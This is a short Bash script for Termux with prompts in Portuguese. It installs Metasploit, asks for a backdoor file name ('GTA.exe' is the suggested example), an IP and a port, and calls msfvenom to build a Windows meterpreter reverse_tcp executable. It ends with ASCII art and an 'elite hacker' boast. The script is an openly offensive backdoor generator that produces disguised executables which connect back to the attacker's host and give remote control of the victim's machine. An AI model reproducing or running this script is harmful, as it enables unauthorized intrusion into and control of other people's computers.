#!/bin/bash

#ATT

apt update
apt install mpv
pkg install unstable-repo
apt install metasploit


#Name Backdoor
read -p "Informe o nome do backdoor : exemplo GTA.exe > " nome1
#Number IP
read -p "Informe o ip externo ou interno seu > " ip1

#Number Port
read -p "Informe uma porta > " Port1

msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip1 LPORT=$Port1 -f exe > /data/data/com.termux/files/home/$nome1
 echo
echo " .EXE CRIADO COM ÉXITO ✓ "


echo " ..............                                     "
echo "            ..,;:ccc,.                              "
echo "          ......''';lxO.                            "
echo " .....''''..........,:ld;                           "
echo "           .';;;:::;,,.x,                           "
echo "      ..'''.            0Xxoc:,.  ...               "
echo "   ....                ,ONkc;,;cokOdc',.            "
echo "  .                   OMo           ':ddo.          "
echo "                    dMc               :OO;          "
echo "                    0M.                 .:o.        "
echo "                    ;Wd                             "
echo "                     ;XO,                           "
echo "                       ,d0Odlc;,..                  "
echo "                           ..',;:cdOOd::,.          "
echo "                                    .:d;.':;.       "
echo "                                       'd,  .'      "
echo "                                         ;l   ..    "
echo "                                          .o        "
echo "                                            c       "
echo "                                            .'      "
echo "                                             .      "
echo "     NÃO SOU BLACK MAIS SIM ELITE HACKER ✓               "

# LEMBRE-SE: HACKER DE VERDADE É AQUELE QUE SABE LANG ✓
